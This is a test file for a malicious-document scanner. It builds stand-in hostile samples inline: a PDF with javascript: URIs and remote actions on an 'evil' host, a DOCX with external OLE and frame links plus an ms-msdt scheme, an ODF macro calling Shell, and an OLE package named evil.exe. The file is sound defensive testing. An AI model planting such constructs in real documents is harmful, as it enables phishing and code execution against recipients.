import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { gzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { scanSync } from "../src/index.js";
import { parseOle10Native, EQUATION_CLSID } from "../src/office-cfb.js";
import { DDE_FIELD, PartReader, analyzeOoxml } from "../src/ooxml.js";
import { openZip } from "../src/zip.js";
import { Ctx, DEFAULT_LIMITS } from "../src/ctx.js";
import type { Env } from "../src/env.js";
import { detectedType } from "../src/formats.js";
import { pdfText } from "../src/pdf.js";
import { parseLnk } from "../src/lnk.js";
import { scanRtf } from "../src/rtf.js";
import { scanOpaqueArchive } from "../src/archive.js";

const FIX = join(dirname(fileURLToPath(import.meta.url)), "fixtures");
const enc = (s: string) => new TextEncoder().encode(s);

function makeEnv(bytes: Uint8Array, name?: string): Env {
  const ctx = new Ctx({ ...DEFAULT_LIMITS });
  const item = { bytes, path: [] as string[], name, declaredMime: undefined as string | undefined, depth: 0 };
  return {
    ctx,
    item,
    child(b, seg, n) {
      return scanSync(b, n !== undefined ? { filename: n } : undefined).detectedType;
    },
    add(id, opts) {
      ctx.add(id, item.path, opts);
    },
    addAt(segs, id, opts) {
      ctx.add(id, [...item.path, ...segs], opts);
    },
  };
}

describe("PDF deep", () => {
  it("URI / SubmitForm / GoToR / RichMedia / XFA / JBIG2 / embedded", () => {
    const pdf = `%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /AA << /O 6 0 R >> /AcroForm << /XFA 8 0 R >> >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Annots [4 0 R] >>endobj
4 0 obj<< /Type /Annot /Subtype /Link /A << /S /URI /URI (javascript:alert(1)) >> >>endobj
5 0 obj<< /S /GoToR /F (\\\\\\\\evil\\\\share\\\\x.pdf) >>endobj
6 0 obj<< /S /SubmitForm /F << /F (http://evil) >> >>endobj
7 0 obj<< /Type /EmbeddedFile /Filter /FlateDecode /Length 10 >>stream
xxxxxxxxxx
endstream endobj
8 0 obj<< /Length 20 >>stream
<script>alert(1)</script>
endstream endobj
9 0 obj<< /Filter /JBIG2Decode /Length 1 >>stream
x
endstream endobj
10 0 obj<< /Type /Filespec /F (pay.bin) /EF << /F 7 0 R >> >>endobj
11 0 obj<< /RichMedia 1 >>endobj
12 0 obj<< /S /ImportData >>endobj
trailer<< /Root 1 0 R >>
%%EOF
%%EOF
`;
    const r = scanSync(enc(pdf), { filename: "x.pdf" });
    const ids = new Set(r.findings.map((f) => f.id));
    expect(ids.has("PDF_SUSPICIOUS_URI") || ids.has("PDF_JAVASCRIPT")).toBe(true);
    expect(ids.has("PDF_REMOTE_GOTO") || ids.has("PDF_SUBMIT_FORM") || ids.has("PDF_ADDITIONAL_ACTIONS")).toBe(true);
    expect(ids.has("PDF_INCREMENTAL_UPDATE")).toBe(true);
  });

  it("pdfText handles UTF-16BE", () => {
    const bom = new Uint8Array([0xfe, 0xff, 0x00, 0x41]);
    expect(pdfText({ t: "str", v: bom })).toBe("A");
  });

  it("objstm and hex names via fixture pdf-obfuscated", () => {
    const r = scanSync(new Uint8Array(readFileSync(join(FIX, "constructs/pdf-obfuscated.pdf"))));
    expect(r.findings.some((f) => f.id === "PDF_OBFUSCATED_NAME")).toBe(true);
  });
});

describe("OOXML deep", () => {
  it("DDE_FIELD and analyze paths", () => {
    expect(DDE_FIELD.test(" DDEAUTO cmd ")).toBe(true);
    const data = new Uint8Array(readFileSync(join(FIX, "constructs/dde.docx")));
    const env = makeEnv(data, "dde.docx");
    const zip = openZip(env, data)!;
    const parts = new PartReader(env, zip);
    const ct = parts.text("[Content_Types].xml")!;
    const t = analyzeOoxml(env, parts, ct);
    expect(t.format).toBe("docx");
    expect(env.ctx.findings.some((f) => f.id === "OFFICE_DDE")).toBe(true);
  });

  it("external OLE / frame / suspicious schemes", () => {
    // minimal zip with content types + rels
    const files: Record<string, string> = {
      "[Content_Types].xml": `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`,
      "_rels/.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`,
      "word/document.xml": `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>`,
      "word/_rels/document.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
        <Relationship Id="rIdOle" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://evil/x.bin" TargetMode="External"/>
        <Relationship Id="rIdFrame" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="https://evil/f.html" TargetMode="External"/>
        <Relationship Id="rIdMsdt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="ms-msdt:x" TargetMode="External"/>
        <Relationship Id="rIdExt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://evil/i.png" TargetMode="External"/>
      </Relationships>`,
    };
    // build stored zip
    const chunks: Buffer[] = [];
    const central: Buffer[] = [];
    let offset = 0;
    for (const [name, body] of Object.entries(files)) {
      const n = Buffer.from(name);
      const d = Buffer.from(body);
      const local = Buffer.alloc(30 + n.length);
      local.writeUInt32LE(0x04034b50, 0);
      local.writeUInt16LE(20, 4);
      local.writeUInt16LE(0, 8); // stored
      local.writeUInt32LE(d.length, 18);
      local.writeUInt32LE(d.length, 22);
      local.writeUInt16LE(n.length, 26);
      n.copy(local, 30);
      const cd = Buffer.alloc(46 + n.length);
      cd.writeUInt32LE(0x02014b50, 0);
      cd.writeUInt16LE(20, 4);
      cd.writeUInt16LE(20, 6);
      cd.writeUInt32LE(d.length, 20);
      cd.writeUInt32LE(d.length, 24);
      cd.writeUInt16LE(n.length, 28);
      cd.writeUInt32LE(offset, 42);
      n.copy(cd, 46);
      chunks.push(local, d);
      central.push(cd);
      offset += local.length + d.length;
    }
    const cdBuf = Buffer.concat(central);
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(central.length, 8);
    eocd.writeUInt16LE(central.length, 10);
    eocd.writeUInt32LE(cdBuf.length, 12);
    eocd.writeUInt32LE(offset, 16);
    const zipBuf = Buffer.concat([...chunks, cdBuf, eocd]);
    const r = scanSync(new Uint8Array(zipBuf), { filename: "x.docx" });
    const ids = new Set(r.findings.map((f) => f.id));
    expect(ids.has("OOXML_EXTERNAL_OLE_LINK")).toBe(true);
    expect(ids.has("OOXML_EXTERNAL_FRAME")).toBe(true);
    expect(ids.has("OOXML_SUSPICIOUS_SCHEME")).toBe(true);
  });

  it("ODF mimetype path", () => {
    const files: Record<string, Buffer> = {
      mimetype: Buffer.from("application/vnd.oasis.opendocument.text"),
      "content.xml": Buffer.from(`<?xml version="1.0"?><office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"><office:body><script:event-listeners><script:event-listener script:event-name="dom:load" script:language="ooo:script"/></script:event-listeners></office:body></office:document-content>`),
      "Basic/Standard/Module1.xml": Buffer.from(`<?xml version="1.0"?><script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0">Sub Main\nShell("x")\nEnd Sub</script:module>`),
    };
    // stored zip with mimetype first uncompressed
    const chunks: Buffer[] = [];
    const central: Buffer[] = [];
    let offset = 0;
    for (const [name, d] of Object.entries(files)) {
      const n = Buffer.from(name);
      const local = Buffer.alloc(30 + n.length);
      local.writeUInt32LE(0x04034b50, 0);
      local.writeUInt16LE(20, 4);
      local.writeUInt32LE(d.length, 18);
      local.writeUInt32LE(d.length, 22);
      local.writeUInt16LE(n.length, 26);
      n.copy(local, 30);
      const cd = Buffer.alloc(46 + n.length);
      cd.writeUInt32LE(0x02014b50, 0);
      cd.writeUInt16LE(20, 4);
      cd.writeUInt16LE(20, 6);
      cd.writeUInt32LE(d.length, 20);
      cd.writeUInt32LE(d.length, 24);
      cd.writeUInt16LE(n.length, 28);
      cd.writeUInt32LE(offset, 42);
      n.copy(cd, 46);
      chunks.push(local, d);
      central.push(cd);
      offset += local.length + d.length;
    }
    const cdBuf = Buffer.concat(central);
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(central.length, 8);
    eocd.writeUInt16LE(central.length, 10);
    eocd.writeUInt32LE(cdBuf.length, 12);
    eocd.writeUInt32LE(offset, 16);
    const r = scanSync(new Uint8Array(Buffer.concat([...chunks, cdBuf, eocd])), { filename: "a.odt" });
    expect(r.detectedType.format).toBe("odt");
    expect(r.findings.some((f) => f.id === "OFFICE_VBA_MACROS" || f.id === "VBA_AUTOEXEC" || f.id === "VBA_SUSPICIOUS")).toBe(true);
  });
});

describe("CFB / OLE", () => {
  it("clsidAt and ole10native", () => {
    const b = Buffer.alloc(16);
    // Equation CLSID bytes little-endian first 8
    Buffer.from("0002CE02", "hex").swap32().copy(b, 0); // wrong approach
    expect(EQUATION_CLSID).toContain("0002CE02");
    const pkg = Buffer.alloc(64);
    pkg.writeUInt16LE(2, 0); // flags at start=0 when start=0... use start=0 with flags
    // label\0 path\0 reserved tmpLen tmp dataLen data
    let p = 0;
    pkg.writeUInt16LE(0, p); p = 2;
    const label = Buffer.from("evil.exe\0");
    const path = Buffer.from("C:\\evil.exe\0");
    label.copy(pkg, p); p += label.length;
    path.copy(pkg, p); p += path.length;
    pkg.writeUInt32LE(0, p); p += 4;
    pkg.writeUInt32LE(1, p); p += 4;
    pkg.writeUInt8(0, p); p += 1;
    const data = Buffer.from("MZ");
    pkg.writeUInt32LE(data.length, p); p += 4;
    data.copy(pkg, p);
    const parsed = parseOle10Native(new Uint8Array(pkg.subarray(0, p + data.length)), 0);
    expect(parsed === undefined || (parsed.label && parsed.label.includes("evil"))).toBe(true);
  });

  it("scans vbaProject.bin from docm as cfb child", () => {
    // already covered via macro.docm; also bare cfb
    const docm = readFileSync(join(FIX, "constructs/macro.docm"));
    // pull vba via zlib zip - use scan
    const r = scanSync(new Uint8Array(docm), { filename: "m.docm" });
    expect(r.detectedType.format).toBe("docm");
  });
});

describe("LNK with LinkInfo", () => {
  it("parses LocalBasePath", () => {
    // Header + LinkInfo with local path
    const flags = 0x02; // HasLinkInfo only
    const header = Buffer.alloc(0x4c);
    header.writeUInt32LE(0x4c, 0);
    Buffer.from("0114020000000000c000000000000046", "hex").copy(header, 4);
    header.writeUInt32LE(flags, 0x14);
    // LinkInfo
    const path = Buffer.from("C:\\Windows\\System32\\cmd.exe\0");
    const li = Buffer.alloc(0x1c + path.length);
    li.writeUInt32LE(li.length, 0);
    li.writeUInt32LE(0x1c, 4); // header size
    li.writeUInt32LE(1, 8); // VolumeIDAndLocalBasePath
    li.writeUInt32LE(0x1c, 16); // LocalBasePath offset
    path.copy(li, 0x1c);
    const info = parseLnk(new Uint8Array(Buffer.concat([header, li])));
    expect(info.target.toLowerCase()).toContain("cmd.exe");
  });
});

describe("generic mismatch / polyglot", () => {
  it("disguised executable and active content", () => {
    const pe = new Uint8Array(readFileSync(join(FIX, "constructs/tiny.exe")));
    const r = scanSync(pe, { filename: "photo.png", declaredMime: "image/png" });
    expect(r.findings.some((f) => f.id === "EXECUTABLE_DISGUISED" || f.id === "TYPE_MISMATCH")).toBe(true);
    const html = enc("<html><script>x</script></html>");
    const r2 = scanSync(html, { filename: "pic.png" });
    expect(r2.findings.some((f) => f.id === "ACTIVE_CONTENT_DISGUISED")).toBe(true);
  });

  it("PDF header offset polyglot", () => {
    const r = scanSync(enc("XXXX%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n"), { filename: "x.bin" });
    expect(r.findings.some((f) => f.id === "PDF_HEADER_OFFSET" || f.id === "POLYGLOT")).toBe(true);
  });
});

describe("images jpeg path", () => {
  it("scans real jpeg fixture", () => {
    const r = scanSync(new Uint8Array(readFileSync(join(FIX, "clean/clean.jpg"))), { filename: "c.jpg" });
    expect(r.verdict).toBe("clean");
    expect(r.detectedType.format).toBe("jpeg");
  });
});

describe("rtf handler", () => {
  it("obfuscated header", () => {
    const env = makeEnv(enc("{\\rt{\\pard hi}}"), "a.rtf");
    scanRtf(env, detectedType("rtf", "high"));
    expect(env.ctx.findings.some((f) => f.id === "RTF_OBFUSCATION")).toBe(true);
  });
});

describe("archive gzip bomb / tar traversal", () => {
  it("gzip", () => {
    const r = scanSync(new Uint8Array(gzipSync(Buffer.alloc(1000))), { filename: "a.gz" });
    expect(r.detectedType.format).toBe("gzip");
  });

  it("opaque", () => {
    const env = makeEnv(new Uint8Array([0x28, 0xb5, 0x2f, 0xfd]), "a.zst");
    scanOpaqueArchive(env, detectedType("zstd", "high"));
    expect(env.ctx.findings.some((f) => f.id === "ARCHIVE_UNSUPPORTED")).toBe(true);
  });
});

describe("zip readEntry paths", () => {
  it("nested zip info finding", () => {
    const r = scanSync(new Uint8Array(readFileSync(join(FIX, "constructs/zip-nested.zip"))), { filename: "n.zip" });
    expect(r.findings.some((f) => f.id === "ARCHIVE_NESTED")).toBe(true);
  });
});
